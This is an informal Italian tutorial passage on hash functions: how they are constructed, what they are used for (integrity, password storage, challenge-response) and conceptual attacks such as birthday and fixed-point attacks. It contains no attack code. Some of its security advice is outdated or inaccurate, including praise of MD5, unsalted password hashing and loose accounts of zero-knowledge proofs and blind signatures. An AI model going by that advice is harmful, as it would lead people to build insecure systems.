| La maggior parte delle funzioni hash oggi usate lavorano a blocchi       | 
| (proprio come gli algoritmi simmetrici), cio' significa che devono prima | 
| suddividere il messaggio M in tanti blocchi m[i] di lunghezza L fissata. | 
| Per assicurarsi che il messaggio sia di lunghezza multipla di L si usa   | 
| una procedura di padding del tutto simile a quella vista per gli         | 
| algoritmi simmetrici, solo che stavolta i bit di padding non possono     | 
| assolutamente essere random (a meno che non si riproduca la stessa       | 
| sequenza random per tutti i messaggi), e' comunque molto piu' facile e   | 
| conveniente settarli tutti a 1 o tutti a 0. Utilizzare una procedura di  | 
| padding in cui sia presente un header che identifica la lunghezza del    | 
| messaggio rende anche molto piu' sicuro l'algoritmo verso attacchi       | 
| particolari, cosa che vedremo piu' avanti. Una volta fatto cio' si deve  | 
| scegliere come opera la funzione, poiche' ci sono diverse alternative.   | 
|                                                                          | 
| Il metodo piu' semplice consiste nel sottoporre ogni blocco a una        | 
| funzione H(), detta "ROUND FUNCTION", la quale puo' o meno accettare     | 
| come parametro addizionale una chiave K a seconda che si voglia          | 
| progettare una keyed hash function o meno. Tale round function prende in | 
| ingresso un singolo blocco m[i] di lunghezza L e opera su di esso una    | 
| trasformazione one-way che lo riduce ad un blocco c[i] di lunghezza l    | 
| (dove l normalmente e' di norma minore di L, comunque mai superiore).    | 
| A questo punto tutti i blocchi c[i] ottenuti vengono XORati tra di loro  | 
| per ottenere un singolo blocco MD di lunghezza l, blocco che sara' poi   | 
| l'hash finale.                                                           | 
| Questo metodo piuttosto elementare assomiglia alla modalita' ECB degli   | 
| algoritmi simmetrici. Proprio come in quel caso infatti, ogni blocco     | 
| c[i] e' indipendente dagli altri, solo il MD finale dipende da tutti i   | 
| c[i]. La cosa, come vedremo, risulta molto pericolosa poiche' un         | 
| attaccante potrebbe alterare facilmente un messaggio ottenendo pero' lo  | 
| stesso hash finale.                                                      | 
|                                                                          | 
| Esattamente come nelle modalita' CFB e CBC allora, potremmo pensare di   | 
| calcolare il MD non alla fine, ma volta per volta man mano che           | 
| processiamo i vari blocchi, con una procedura di concatenamento.         | 
| Dobbiamo allora modificare la funzione H() in modo tale che non accetti  | 
| piu' un solo blocco m[i] in ingresso (a parte l'eventuale K), bensi'     | 
| DUE: uno e' effettivamente m[i], l'altro e' c[i-1], ovvero l'output del  | 
| blocco precedente. Per quanto riguarda il primo blocco di M, proprio     | 
| come nelle modalita' CBC e CFB faremo ricorso ad un IV che potremo       | 
| settare a piacere: potrebbe essere una stringa NULL (tutti zeri), una    | 
| stringa FULL (tutti 1, io la chiamo cosi'...), un valore arbitrario o il | 
| valore della lunghezza in bit del messaggio (scelta consigliata, poi     | 
| vedremo perche'). L'output dell'ultimo blocco sara' il message digest    | 
| del messaggio.                                                           | 
|                                                                          | 
| Questa modalita' e' la piu' sicura, poiche' aggiunge anche una massiccia | 
| estensione d'errore all'algoritmo, ma c'e' anche un altro sistema che    | 
| risulta ottimale in termini di velocita' nei sistemi a multiprocessore.  | 
| Il sistema e' questo: si divide il numero dei blocchi m[i] ottenuti per  | 
| il numero dei processori installati sul sistema. A questo punto ogni     | 
| processore calcola l'hash di solo una parte del messaggio (utilizzando   | 
| tutti pero' lo stesso IV), ottenendo un hash parziale diverso. Infine si | 
| XORano tutti gli hash ottenuti per ottenere il MD finale. E' logico che  | 
| cosi' facendo pero' l'hash cambia a seconda del numero dei "pezzi" del   | 
| messaggio, quindi bisognera' utilizzare alcuni accorgimenti per fare in  | 
| modo che elaboratori con diverso numero di processori ottengano comunque | 
| lo stesso hash per un dato messaggio.                                    | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| =======================                                                  | 
| *** LA FUNZIONE H() ***                                                  | 
| =======================                                                  | 
|                                                                          | 
| La funzione H() e' il "cuore" del nostro algoritmo di hashing, in        | 
| pratica dobbiamo sceglierla in modo tale che abbia tutte le              | 
| caratteristiche che desideriamo debba avere anche l'intero algoritmo. Se | 
| vogliamo ottenere una funzione hash resistente alle collisioni, ad       | 
| esempio, anche la round function H() dovra' esserlo e cosi' via. Una     | 
| cosa molto importante per le funzioni hash in generale e' che la round   | 
| function rispetti lo Strict Avalanche Criterion, in modo che             | 
| l'alterazione anche di un solo bit del messaggio originale sconvolga     | 
| completamente il checksum. Cio' si ottiene stando attenti che ogni       | 
| singolo bit del blocco m[i] in input sia utilizzato, magari piu' di una  | 
| volta, e lo stesso dicasi per il blocco concatenante c[i-1]. Utilizzando | 
| anche operatori ROL e ROR si accentua questo comportamento, perche'      | 
| l'errore "salta" da una posizione all'altra tra i bit dell'hash. Meglio  | 
| ancora se, come accadeva nel CAST, si usa un ROL o ROR variabile, cioe'  | 
| di un numero di posizioni che cambia a seconda dei blocchi o della       | 
| chiave, poiche' tale tecnica si e' rivelata molto efficace verso la      | 
| crittanalisi. Altre proprieta' importanti sono la non-linearita' (quindi | 
| esclusione delle proprieta' commutativa, associativa etc...), l'alta     | 
| distanza Hamming (che ancora non sono riuscito a capire che cazzo        | 
| significa...), il bilanciamento statistico 0-1 etc...                    | 
|                                                                          | 
| La funzione H() spesso comprende delle sottofunzioni che possono         | 
| cambiare a seconda del round, queste sottofunzioni normalmente           | 
| spezzettano m[i] in sottoblocchi piu' piccoli (normalmente indicati come | 
| A, B, C etc...), la cui dimensione in genere e' sufficiente a farli      | 
| entrare in un singolo registro di processore (per motivi di velocita').  | 
| Poi queste sottofunzioni effettuano una serie di operazioni su questi    | 
| sottoblocchi (largamente usate sono operatori booleani non invertibili,  | 
| come AND e OR, ma anche altre operazioni non invertibili), i cui         | 
| risultati vengono ricombinati per ottenere l'output c[i].                | 
|                                                                          | 
| Il metodo di progettazione che abbiamo appena visto genera delle         | 
| funzioni hash in cui la round function e' dedicata, cioe' costruita da   | 
| zero. Pur essendo il metodo obiettivamente migliore finora e il piu'     | 
| largamente usato, ha il grosso svantaggio di non essere lineare e quindi | 
| la sicurezza di una funzione di questo tipo non puo' essere dimostrata a | 
| priori, ma va stimata in conseguenza degli attacchi crittanalitici che   | 
| si riescono a portare avanti contro di essa nel tempo. Si e' cercato di  | 
| costruire funzioni hash basate a loro volta su altri problemi            | 
| logico-matematici, ipotizzando che la loro sicurezza derivi direttamente | 
| da quella gia' nota di tale problema:                                    | 
|                                                                          | 
|  * FUNZIONI HASH BASATE SU BLOCK CYPHERS *                               | 
| Ci sono stati molti sforzi per implementare un cifrario a blocchi gia'   | 
| esistente in una round function, ma finora senza buoni risultati. Il     | 
| loro utilizzo sembrerebbe ideale soprattutto per le keyed hash function, | 
| in teoria sarebbe sufficiente modificare una procedura di crittazione in | 
| modo tale che un attento concatenamento coll'output del blocco           | 
| precedente (il secondo sistema che abbiamo visto sopra) produca un       | 
| risultato one-way. Visto poi che spesso molti cifrari a blocchi sono     | 
| implementabili in hardware, si potrebbe ottenere un consistente aumento  | 
| di velocita'. Purtroppo la pratica e' ben diversa e in genere questo     | 
| sistema causa delle "falle crittanalitiche" che possono essere sfruttate | 
| ad esempio per ottenere collisioni. Poi c'e' a volte anche il problema   | 
| delle restrizioni per l'esportazione degli algoritmi, che ne limita      | 
| l'utilizzo.                                                              | 
|                                                                          | 
|  * FUNZIONI HASH BASATE SU ARITMETICA MODULARE *                         | 
| Cioe' che sfruttano il problema della fattorizzazione o del logaritmo    | 
| discreto modulo M, come abbiamo visto nel capitolo precedente. Il        | 
| message digest si puo' ottenere di dimensioni variabili a piacere        | 
| cambiando la dimensione del modulo. Lentezza a parte, queste funzioni a  | 
| volte si rivelano insicure.                                              | 
|                                                                          | 
|  * FUNZIONI HASH BASATE SU AUTOMI CELLULARI *                            | 
| Gli automi cellulari hanno trovato qualche applicazione nel campo della  | 
| generazione di numeri pseudocasuali, a causa della loro alta             | 
| imprevedibilita'. L'irreversibilita' del procedimento potrebbe portare   | 
| allo sfruttamento di automi cellulari unidimensionali nella              | 
| progettazione di funzioni hash. Il loro utilizzo pero' e' in genere      | 
| molto hardware-oriented ed ha alcune controindicazioni.                  | 
|                                                                          | 
|  * FUNZIONI HASH BASATE SUL PROBLEMA DELLO ZAINO *                       | 
| Si distinguono in due classi a seconda che operino su Zaini Additivi o   | 
| Zaini Moltiplicativi. Finora si sono rivelate insicure.                  | 
|                                                                          | 
|  * FUNZIONI HASH BASATE SU MATRICI ALGEBRICHE *                          | 
| Senza entrare nel dettaglio diciamo che usano l'algebra delle matrici,   | 
| cioe' un tipo di algebra non commutativa. Presentano diverse debolezze,  | 
| come la possibilita' di trovare collisioni.                              | 
|                                                                          | 
| Ed ora vediamo cosa e' possibile fare con le funzioni hash.              | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ===================================                                      | 
| *** IMPIEGO DELLE FUNZIONI HASH ***                                      | 
| ===================================                                      | 
|                                                                          | 
| Questi che riporto sono solo una minuscola parte dei possibili utilizzi  | 
| delle funzioni one-way. Per una panoramica piu' completa sui protocolli  | 
| che utilizzano funzioni hash vi consiglio di dare un'occhiata ad         | 
| "Applied Cryptography" di Bruce Schneier, praticamente la Bibbia del     | 
| crittologo  =)                                                           | 
|                                                                          | 
|                                                                          | 
| [CALCOLO DEL FINGERPRINT]                                                | 
| Qualsiasi canale di trasmissione reale e' affetto da noise. Con          | 
| l'utilizzo del digitale la possibilita' che si verifichi un errore di    | 
| trasmissione e' relativamente bassa, ma comunque diversa da zero. E'     | 
| facile intuire che maggiore e' il numero dei bit da trasmettere e        | 
| maggiore e' la probabilita' che si verifichino errori. Quando inviamo un | 
| file attraverso e-mail ad esempio, possiamo utilizzare le funzioni hash  | 
| per dare al ricevente la ragionevole sicurezza che il file gli sia       | 
| arrivato sano ed integro, basta allegare al messaggio originale anche    | 
| l'hash del messaggio (che, essendo costituito da pochi bit, e' legittimo | 
| pensare che non sara' affetto da disturbi) ottenuto con una funzione     | 
| one-way hash. Il nostro interlocutore poi non dovra' fare altro che      | 
| ricalcolare l'hash e verificare che coincida con quello che gli abbiamo  | 
| trasmesso. Con questo sistema si possono "etichettare" delle grosse      | 
| sequenze di dati con un fingerprint quasi univoco, cosa che puo'         | 
| risultare utile ad esempio per verificare rapidamente se un documento e' | 
| attualmente presente o meno in un archivio, per cercare un dato file in  | 
| rete (come fanno ad esempio le ultime verioni di WinMX e compagnia), per | 
| identificare una chiave pubblica etc. Utilizzando una funzione           | 
| anti-collisione si puo' anche verificare che il messaggio che mi e'      | 
| stato inviato da Tizio non sia stato, lungo il tragitto, alterato da     | 
| Caio, banalmente basta fare una telefonata a Tizio e chiedergli l'hash   | 
| del messaggio (chiedere di trasmettere tutto il messaggio per telefono   | 
| e' in genere impraticabile). Quando vado a decrittare un messaggio       | 
| crittato simmetricamente, per sapere se la chiave inserita era giusta o  | 
| no basta calcolare l'hash del testo che ho ottenuto e confrontarlo con   | 
| l'hash che era allegato al cyphertext (cosa che ad esempio fa il PGP, e' | 
| cosi' che so se ho azzeccato o meno la pass giusta) etc...               | 
|                                                                          | 
|                                                                          | 
| [PASSPHRASE SCHEDULING]                                                  | 
| La maggior parte degli algoritmi a blocchi accettano in ingresso una     | 
| chiave di lunghezza fissata. Cio' puo' essere una grossa seccatura se    | 
| tale chiave deve essere fornita dall'utente, poiche' gli sara' concesso  | 
| utilizzare per la sua password proprio QUEL dato numero di caratteri,    | 
| non uno di piu' e non uno di meno (esattamente come succedeva e succede  | 
| tuttora nei vecchi sistemi UNIX). Inoltre c'e' un notevole calo di       | 
| sicurezza, poiche' come ben sapete ci sono alcuni caratteri (quelli di   | 
| controllo ad esempio) che l'utente non puo' usare, se fate un piccolo    | 
| controllo capirete che cio' significa che l'utente non ha la             | 
| possibilita' di scegliere alcuni bit della chiave (che rimangono         | 
| imposti, a causa della ridondanza del linguaggio ASCII stampabile), e di | 
| conseguenza la dimensione della chiave rispetto al brute-forcing si      | 
| abbassa notevolmente. Si puo' usare allora una funzione hash resistente  | 
| alle collisioni per calcolare l'hash di una passphrase di lunghezza      | 
| arbitraria scelta dall'utente, l'hash ottenuto sara' quindi utilizzato   | 
| come chiave per il cifrario simmetrico. In questo modo si bypassa anche  | 
| il problema della ridondanza, poiche' gli hash prodotti sono ad alta     | 
| entropia (infatti vengono normalmente rappresentati in hex). C'e' pero'  | 
| la controindicazione che esistera' sicuramente piu' di una passphrase in | 
| grado di decrittare un dato messaggio, poiche' le collisioni non possono | 
| mai essere del tutto impedite. Fortunatamente la possibilita' che cio'   | 
| si verifichi e' del tutto trascurabile, tanto che anche il PGP usa       | 
| questo metodo.                                                           | 
|                                                                          | 
|                                                                          | 
| [CRITTAZIONE TRAMITE CFB]                                                | 
| Cio' che ci serve e' una funzione hash a chiave che abbia queste         | 
| caratteristiche:                                                         | 
|                                                                          | 
|  - la dimensione della chiave deve essere sufficiente a garantire        | 
|    resistenza al brute-forcing                                           | 
|  - la dimensione dei blocchi in input deve essere uguale a quella dei    | 
|    blocchi in output (il caso limite)                                    | 
|  - possibilmente la dimensione della chiave deve essere maggiore (cmq    | 
|    mai minore) di quella dei blocchi (per i motivi visti al cap.6)       | 
|                                                                          | 
| In questo caso possiamo implementare questa funzione hash a chiave in    | 
| modalita' CFB, come gia'visto al cap.6.                                  | 
|                                                                          | 
|                                                                          | 
| [RNG]                                                                    | 
| Si possono usare le funzioni hash per la generazione di bit              | 
| pseudorandom, cio' che occorre e' una funzione hash collision-free in    | 
| cui la dimensione dei blocchi in input sia uguale a quella dei blocchi   | 
| in output. Basta caricare l'IV del metodo a concatenazione con veri dati | 
| random di rumore ad alta entropia, o comunque proveniente dall'ambiente, | 
| poi si usa la funzione hash per generare degli output pseudorandom, i    | 
| quali vengono poi di nuovo processati a cascata dalla funzione e cosi'   | 
| via. In questo caso occorre pero' che la round function sia biettiva (la | 
| round function ho detto, non l'intero algoritmo, che abbiamo visto non   | 
| puo' essere nemmeno iniettivo), in modo che due blocchi diversi non      | 
| producano mai lo stesso output, o quanto meno assicurarsi che il periodo | 
| della round function (diciamo il codominio per semplificare, anche se    | 
| non sarebbe proprio esatto...) sia il piu' vasto possibile. Un           | 
| generatore costruito in questo modo puo' fornire un massimo di L * P bit | 
| pseudorandom, dove L e' la dimensione dei blocchi e P e' il massimo      | 
| numero di iterazioni che si possono fare prima di entrare in loop. Nel   | 
| caso migliore (round function biettiva) questo equivale a un periodo di  | 
| L * 2^L bit. Per L = 128 questa quantita' e' raccapricciantemente        | 
| grossa.                                                                  | 
|                                                                          | 
|                                                                          | 
| [AUTENTICAZIONE PASSWORD PULITA]                                         | 
| Immaginiamo che voi abbiate un server, al quale possono accedere diversi | 
| utenti ognuno con la sua password. Quando un utente si collega al server | 
| e immette la password vi serve un metodo per controllare che tale pass   | 
| sia giusta. Il primo programmatore che consultate vi propone questo      | 
| metodo:                                                                  | 
|                                                                          | 
|  - salvate su passwd file le pass in chiaro degli utenti, controllando   | 
|    che la pass inserita di volta in volta combaci con quella salvata.    | 
|    Qualsiasi pirla con accesso al passwd file puo' leggere le pass in    | 
|    chiaro di tutti gli utenti.                                           | 
|                                                                          | 
| Licenziate l'idiota senza pensarci due volte, tanto ci pensa il Governo  | 
| a creare nuova occupazione (ihihih). Il secondo programmatore vi propone | 
| due alternative:                                                         | 
|                                                                          | 
|  - salvate su passwd file le password NON in chiaro, ma crittate con una | 
|    chiave che solo voi conoscete. Dovete stare alzati giorno e notte per | 
|    autenticare le password degli utenti che si collegano al server alle  | 
|    ore piu' folli del giorno e della notte. Oppure appiccate un          | 
|    foglietto sopra il case con su scritta la chiave e delegate il        | 
|    compito ad altri webmaster...                                         | 
|  - salvate su passwd file le password NON in chiaro, ma crittate con una | 
|    chiave che solo il computer conosce, perche' e' salvata su disco.     | 
|    Qualsiasi pirla con accesso sia al passwd file che alla chiave puo'   | 
|    leggere le pass in chiaro di tutti gli utenti.                        | 
|                                                                          | 
| Dopo aver procurato altro lavoro al Governo consultate il terzo          | 
| programmatore, che vi da' di nuovo due opzioni:                          | 
|                                                                          | 
|  - usate la password dell'utente come chiave simmetrica per crittare il  | 
|    suo login name. Il cyphertext ottenuto lo salvate sul passwd. Quando  | 
|    l'utente si collega il computer prende il suo login e lo critta con   | 
|    la pass inserita. Se il risultato coincide con il cyphertext del      | 
|    passwd allora l'utente e' autenticato.                                | 
|  - salvate su passwd file non la password dell'utente, bensi' l'HASH     | 
|    della sua chiave. Quando l'utente si collega il computer calcola      | 
|    l'hash della pass fornita a verifica che coincida con quello salvato. | 
|                                                                          | 
| Anche se entrambi i sistemi sono largamente usati in Rete, il secondo e' | 
| piu' recente ed e' di gran lunga il migliore. Le precauzioni che bisogna | 
| prendere sono usare un algoritmo simmetrico resistente a plaintext       | 
| attack (altrimenti chiunque ha accesso al passwd potrebbe fare qualche   | 
| gioco di prestigio per ricavare la chiave) nel primo caso, oppure una    | 
| collision-free hash function nel secondo caso.                           | 
|                                                                          | 
|                                                                          | 
| [AUTENTICAZIONE HOST]                                                    | 
| Al giorno d'oggi non si sa piu' con chi si ha a che fare... tanto piu'   | 
| vero nel cablato mondo dei pacchetti d'informazione. Mettiamo caso che   | 
| abbiate bisogno di collegarvi ad un server remoto per richiedere un      | 
| servizio (ad esempio, una banca per ritirare dei soldi), ma l'host vi    | 
| chiede di inserire il vostro PIN o la vostra password per identificarvi. | 
| Nel pieno rispetto dei vostri istinti paranoici, voi non siete molto     | 
| felici di fare cio': chi vi garantisce che state comunicando veramente   | 
| con la banca e non con un eavesdropper che usera' poi il codice che vi   | 
| ha carpito per usufruire del servizio a nome vostro? Insomma, se la      | 
| banca vuole essere sicura che io sono io, prima IO voglio essere sicuro  | 
| che la banca sia la banca! Ci sono due sistemi per fare cio': il primo   | 
| e' utilizzare la firma digitale tramite crittografia a chiave pubblica.  | 
| E' il metodo piu' sicuro perche' non c'e' nessuno scambio di             | 
| informazioni riservate, e la chiave pubblica della banca e' liberamente  | 
| reperibile da chiunque.                                                  | 
|                                                                          | 
| Ma questo NON E' il capitolo della firma digitale.                       | 
|                                                                          | 
| In effetti c'e' un altro sistema, piu' semplice, ma per attuarlo bisogna | 
| avere scambiato almeno una volta in modo sicuro informazioni riservate   | 
| con la banca (andandoci di persona oppure tramite protocollo asimmetrico | 
| DH o simili). Funziona cosi': quando aprite il vostro conto corrente in  | 
| banca, questa vi rilascia un codice identificativo personale segreto,    | 
| che conoscete solamente voi e la banca (naturalmente la banca conosce i  | 
| codici di tutti gli utenti). Nel momento in cui vogliate essere sicuri   | 
| che state davvero comunicando con la banca, tutto cio' che la banca deve | 
| fare e' dimostrarvi in qualche modo di conoscere il vostro codice, ma    | 
| naturalmente non puo' mandarvelo in chiaro! Allora voi (tramite una      | 
| smart card o un Bancomat ad esempio) nel momento in cui vi collegate al  | 
| server della banca generate una sequenza di bit pseudorandom e gliela    | 
| inviate (questa sequenza e' detta STRINGA DI CHALLENGE). La banca a      | 
| questo punto usera' una funzione hash a chiave per calcolare l'hash      | 
| della stringa di challenge usando come chiave il vostro codice, e voi    | 
| farete altrettanto. A questo punto la banca risponde al challenge        | 
| inviandovi tale hash, se corrisponde con quello che avete calcolato voi  | 
| allora avete la ragionevole sicurezza di stare effettivamente dialogando | 
| con la banca.                                                            | 
|                                                                          | 
|                                                                          | 
| [FIRMA DIGITALE]                                                         | 
| Nel caso appena visto l'elemento chiave era la presenza di               | 
| un'informazione riservata (il codice) che pero' era conosciuta da        | 
| entrambe le parti. In tutti quei casi in cui c'e' un'informazione        | 
| segreta condivisa da piu' utenti e' facilissimo implementare un          | 
| protocollo di firma digitale senza usare algoritmi asimmetrici, ma solo  | 
| keyed hash functions. Supponiamo ad esempio che Alice voglia mandare un  | 
| messaggio a Bob facendo in modo che Bob sia sicuro che e' stata          | 
| effettivamente lei a mandarglielo. Se c'e' una qualche informazione      | 
| segreta che Alice e Bob condividono, allora Alice puo' usare una keyed   | 
| hash function per calcolare l'hash del messaggio usando come chiave tale | 
| informazione. Bob sa che tale hash e' stato possibile generarlo solo     | 
| tramite quell'informazione, e quindi ha la ragionevole certezza          | 
| dell'identita' del mittente.                                             | 
|                                                                          | 
|                                                                          | 
| [ZERO-KNOWLEDGE SECRET PROOFING]                                         | 
| L'idea di un'informazione riservata condivisa a priori da due utenti     | 
| puo' essere estesa per dimostrare a qualcuno di conoscere un certo       | 
| segreto SENZA rivelargli il segreto, a patto che anche questo            | 
| interlocutore conosca il segreto.                                        | 
|                                                                          | 
| &lt;lettore> ...                                                            | 
|                                                                          | 
| La cosa puo' sembrare paradossale. Vediamo un esempio.                   | 
|                                                                          | 
| &lt;Alice> Conosco l'ingrediente segreto della Coca-Cola.                   | 
| &lt;Bob> Non dire idiozie! IO conosco quell'ingrediente, ma mi sembra molto | 
|       improbabile che lo conosca anche tu...                             | 
| &lt;Alice> Si' che lo conosco!                                              | 
| &lt;Bob> Scommetto 100Ç che non e' vero!                                    | 
| &lt;Alice> Hai voglia di perderli quei 100Ç? Eccoti accontentato!           | 
|                                                                          | 
| E Alice sussurra il segreto all'orecchio di Bob. Bob paga i 100Ç. Dopo   | 
| alcuni mesi Bob e' ricco sfondo e Alice non ha neanche i soldi per       | 
| comprarsi la Coca-Cola. La storia cosi' finisce a lieto fine perche' Bob | 
| e' ricco e Alice ha finalmente smesso di bere schifezze, ma sarebbe      | 
| potuta finire in modo diverso se Alice invece di rivelare l'ingrediente  | 
| segreto a Bob gli avesse rivelato l'HASH dell'ingrediente. Se davvero    | 
| Bob avesse conosciuto anche lui l'ingrediente avrebbe potuto constatare  | 
| che l'hash era esatto e che quindi esisteva una possibilita'             | 
| trascurabile che Alice stesse mentendo. Se invece Bob avesse bluffato,   | 
| con l'hash non avrebbe potuto farci nulla.                               | 
|                                                                          | 
|                                                                          | 
| [BLIND SIGNATURES]                                                       | 
| Alice vuole che un notaio firmi un certo documento per provarne          | 
| l'autenticita'. Pero' non vuole che il notaio legga il documento,        | 
| dopotutto non sono fatti suoi. In casi come questo basta far firmare al  | 
| notaio non il messaggio, ma l'HASH del messaggio. Se se ne presentasse   | 
| l'occasione, ad Alice bastera' tirare fuori il messaggio originale per   | 
| dimostrare che l'hash prodotto e' proprio quello che il notaio ha        | 
| firmato.                                                                 | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ============================================                             | 
| *** METODI DI ATTACCO ALLE FUNZIONI HASH ***                             | 
| ============================================                             | 
|                                                                          | 
| Ora vediamo alcune tipologie di attacco contro le funzioni hash. Un      | 
| attacco contro una funzione hash va a segno se riesce a smentire una     | 
| certa proprieta' che quell'algoritmo dice di avere. Se ad esempio una    | 
| funzione hash si presenta come collision-free, un attacco si considera   | 
| riuscito se si riesce a generare anche una sola coppia di messaggi che   | 
| danno lo stesso hash. Nel caso delle keyed hash function, vanno inclusi  | 
| anche i metodi di attacco contro la chiave.                              | 
| Questi attacchi sono suddivisi in tre classi: ATTACCHI GENERALI,         | 
| ATTACCHI SPECIALI e ATTACCHI DI ALTO LIVELLO.                            | 
|                                                                          | 
| I metodi di attacco generali sono indipendenti dall'algoritmo. Essi      | 
| possono cioe' essere applicati a tutti gli algoritmi di hashing          | 
| indistintamente, ma sono anche i meno efficaci.                          | 
|                                                                          | 
| Gli attacchi generali invece dipendono dall'algoritmo. Cio' significa    | 
| che per resistere a questi attacchi bisogna prestare attenzione nella    | 
| progettazione dell'algoritmo stesso, in altre parole alcuni algoritmi    | 
| potrebbero esservi suscettibili e altri no.                              | 
|                                                                          | 
| Infine gli attacchi ad alto livello si applicano al protocollo con cui   | 
| vengono implementate le funzioni hash.                                   | 
|                                                                          | 
|                                                                          | 
| =========================                                                | 
| *** ATTACCHI GENERALI ***                                                | 
| =========================                                                | 
|                                                                          | 
| [Random Attack]                                                          | 
|                                                                          | 
| Semplicemente, si prende un messaggio qualsiasi e si spera che il suo    | 
| hash coincida con quello desiderato. Se r e' la dimensione in bit del    | 
| fingerprint la possibilita' di successo e' solo di 1 / 2^r.              | 
|                                                                          | 
|                                                                          | 
| [Birthday Attack]                                                        | 
|                                                                          | 
| Questo attacco viene usato per trovare delle collisioni, cioe' in        | 
| pratica due messaggi che hashino (marooo' che verbo...) allo stesso      | 
| modo. Il nome deriva dal cosiddetto "Paradosso del Compleanno", che e'   | 
| la probabilita' di trovare almeno due persone con lo stesso compleanno   | 
| tra 23 persone.                                                          | 
| Per trovare una collisione generica, l'attaccante intende generare due   | 
| messaggi qualsiasi che abbiano lo stesso hash. Assumiamo che la          | 
| lunghezza del message digest sia di r bit, equivalente a 2^r possibili   | 
| hash. Allora l'attaccante genera due "pool" di messaggi, uno contenente  | 
| x messaggi (quelli considerati "autentici") e l'altro y messaggi (quelli | 
| fasulli che l'attaccante cerca di far hashare ad un valore valido). La   | 
| probabilita' P di trovare un match tra l'hash di uno dei messaggi del    | 
| primo gruppo e l'hash di uno del secondo e' circa:                       | 
|                                                                          | 
|     P ~= 1 - e^(-xy/2^r)                                                 | 
|                                                                          | 
| dove e e' la costante di Eulero e y e' molto grande. In particolare      | 
| se x = y = 2^(r/2), la possibilita' di trovare una collisione diventa:   | 
|                                                                          | 
|     P ~= 1 - 1/e ~= 0.63 = 63%                                           | 
|                                                                          | 
| Il grosso vantaggio del Birthday attack e' che se l'avversario aumenta   | 
| leggermente la dimensione dei "pool", la probabilita' aumenta            | 
| considerevolmente.                                                       | 
| Spesso l'attaccante intende trovare una collisione specifica, ha cioe'   | 
| in mano un unico messaggio e il relativo hash, e desidera trovare un     | 
| altro messaggio il cui hash coincida con quello dato.                    | 
| In questo caso, x = 1, quindi la probabilita' di riuscita e':            | 
|                                                                          | 
|     P ~= 1 - e^(-y/2^r)                                                  | 
|                                                                          | 
| che e' molto piu' bassa. Nelle keyed hash function questo attacco e' in  | 
| genere inefficace, perche' per calcolare il checksum serve anche la      | 
| chiave. Il Birthday Attack e' uno degli attacchi piu' sfruttati contro   | 
| le funzioni hash, l'unico modo per proteggersi e' usare message digest   | 
| sufficientemente lunghi. L'MD5 ad esempio e' considerato uno dei         | 
| migliori algoritmi di hashing disponibile, tanto che e' usato anche dal  | 
| PGP, e produce fingerprint di 128 bit. Al giorno d'oggi 128 bit non      | 
| rappresentano piu' quello scoglio computazionale insormontabile per      | 
| portare a segno un birthday attack, pur restando un buon margine. Per    | 
| diversi anni a venire un message digest di 160 bit, come quello fornito  | 
| dal SHA, dovrebbe essere sufficiente, ma i tempi richiedono ormai dei    | 
| valori hash di almeno 256 bit. La tecnologia e' gia' piu' che adeguata a | 
| gestire questa dimensione senza sforzo, inoltre questi valori            | 
| servirebbero a effettuare passphrase scheduling per gli algoritmi        | 
| simmetrici di nuova generazione che usano chiavi proprio a 256 bit.      | 
|                                                                          | 
|                                                                          | 
| [Estrapolazione della chiave]                                            | 
|                                                                          | 
| Questo attacco e' piu' raffinato e si usa contro le keyed hash function. | 
| Se l'avversario ha accesso ad una o piu' coppie messaggio-hash, esso     | 
| puo' tentare di ricavare la chiave usata. Diciamo subito pero' che non   | 
| essendo la dimensione del messaggio legata alla dimensione dell'hash in  | 
| proporzione 1 a 1, piu' di una chiave valida per QUEL dato messaggio     | 
| puo' essere trovata, per trovare univocamente la chiave giusta servono   | 
| molte coppie corrette messaggio-hash, tanto piu' se a venire attaccata   | 
| e' una funzione di hash collidente.                                      | 
|                                                                          | 
|                                                                          | 
| =========================                                                | 
| *** ATTACCHI SPECIALI ***                                                | 
| =========================                                                | 
|                                                                          | 
| [Meet in the Middle Attack]                                              | 
|                                                                          | 
| Da non confondere con il piu' noto "Man in the Middle Attack", questa e' | 
| una variante del Birthday attack con la quale un attacker cerca di       | 
| ottenere un messaggio il cui hash sia quello desiderato. Questo attacco  | 
| non e' particolarmente efficace, di certo non piu' del Birthday attack,  | 
| e puo' comunque essere usato solo su quel tipo di funzioni hash che      | 
| vengono normalmente usate per la crittazione tramite CFB (e quindi in    | 
| genere NON per generare fingerprint).                                    | 
|                                                                          | 
|                                                                          | 
| [Correcting Block Attack]                                                | 
|                                                                          | 
| In questo caso l'attaccante prende una coppia hash-messaggio             | 
| preesistente e cerca di modificare un blocco di messaggio facendo in     | 
| modo che l'hash finale non cambi. Round function che usano pesantemente  | 
| il SAC non sono vulnerabili a questo tipo di attacco (anche se si perde  | 
| qualcosa in velocita').                                                  | 
|                                                                          | 
|                                                                          | 
| [Fixed Point Attack]                                                     | 
|                                                                          | 
| L'attacker cerca un PUNTO FISSO nella round function f(). Un punto fisso | 
| e' un blocco concatenante (risultato dell'iterazione precedente) X[i]    | 
| per il quale f(X[i], M[i]) = X[i]. Cio' significa che l'esistenza del    | 
| blocco di messaggio M[i] non cambia il risultato finale, e che M[i] puo' | 
| quindi essere inserito nel messaggio ogni volta che la variabile         | 
| concatenante vale X[i]. Per eludere questo attacco basta inserire nel    | 
| messaggio l'header con la sua lunghezza, e il SAC fara' il resto...      | 
| Da notare pero' che nel caso ci siano diversi punti fissati in un certo  | 
| messaggio l'attaccante potrebbe inserire da una parte un blocco fasullo  | 
| e rimuoverne uno autentico da un'altra parte, lasciando intatta la       | 
| lunghezza, ma questa manovra e' estremamente difficile e in genere tanto | 
| piu' inefficace quanto maggiore e' la dimensione dei blocchi.            | 
|                                                                          | 
|                                                                          | 
| [Attacchi al Block Cypher Costituente]                                   | 
|                                                                          | 
| Nel caso in cui la round function sia costruita a partire da un cifrario | 
| a blocchi, praticamente tutti gli attacchi effettuabili su tale cifrario | 
| possono essere applicati alla round function.                            | 
|                                                                          | 
|                                                                          | 
| [Crittanalisi Differenziale]                                             | 
|                                                                          | 
| Nella crittanalisi differenziale viene studiata la relazione che lega la | 
| variazione di input alla variazione di output. L'attacker in pratica     | 
| cerca uno specifico valore di variazione di input per causare una certa  | 
| variazione di output. Se riesce a ridurre questa variazione a zero, gli  | 
| e' possibile trovare delle collisioni. Abbiamo gia' detto che l'uso di   | 
| operatori Rotate variabili nella round function elude molto bene questi  | 
| attacchi.                                                                | 
